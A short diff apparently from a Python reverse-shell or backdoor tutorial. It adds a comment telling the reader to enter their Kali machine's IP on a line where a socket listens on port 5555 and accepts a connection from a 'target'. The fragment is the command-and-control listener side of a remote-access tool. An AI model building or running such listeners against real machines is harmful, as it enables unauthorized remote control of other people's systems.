@@ -58,7 +58,7 @@ def target_communication():
          print(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.1.236', 5555))
+sock.bind(('192.168.1.236', 5555)) #Make sure you put in your IP address for your Kali machine
 print('[+] Listening For Incoming Connections')
 sock.listen(5)
 target, ip = sock.accept()
